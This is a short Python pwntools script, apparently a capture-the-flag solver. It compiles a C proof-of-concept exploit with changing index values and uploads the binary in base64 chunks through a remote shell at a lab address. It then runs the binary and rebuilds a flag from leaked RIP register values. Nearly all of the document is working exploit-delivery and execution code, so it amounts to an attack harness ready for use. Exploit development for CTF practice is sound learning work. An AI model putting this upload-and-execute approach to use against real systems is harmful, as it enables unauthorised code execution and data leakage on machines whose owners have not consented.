from pwn import *
import subprocess
from binascii import unhexlify

template_poc = open('poc.c', 'r').read()
flag = b''
for i in range(5):
    idx = -232+i
    poc = template_poc.replace('#IDX', str(idx))
    open('tmp.c', 'wb').write(poc.encode())
    result = subprocess.run('musl-gcc tmp.c -o poc -static && base64 -w0 poc && rm -rf poc tmp.c', shell=True, stdout=subprocess.PIPE).stdout

    with context.local(log_level = 'error'):
        p = remote('172.17.0.2', 3003)
        p.sendlineafter(b'$', b'stty -onlcr') # https://stackoverflow.com/a/38860632/13734176

        # send the exp
        print(f'[{i}] sending exploit file')
        x=512
        for i in range(0, int(len(result)/x)+1):
            payload = b'echo "%s" >> bin' % (result[i*x:x*(i+1)])
            p.sendlineafter(b'$', payload)
            print('.',end='')
        print()

        # execute the exp
        p.sendlineafter(b'$', b'base64 -d bin > exploit && chmod +x exploit')
        p.sendlineafter(b'$', b'./exploit')
        rip_leak = p.recvline_contains(b'RIP').decode().strip()
        print(rip_leak)
        flag += unhexlify(rip_leak.split('0x')[-1])[::-1]
        p.close()

        # sleep 1 sec
        sleep(1)

log.success(f'flag : {flag}')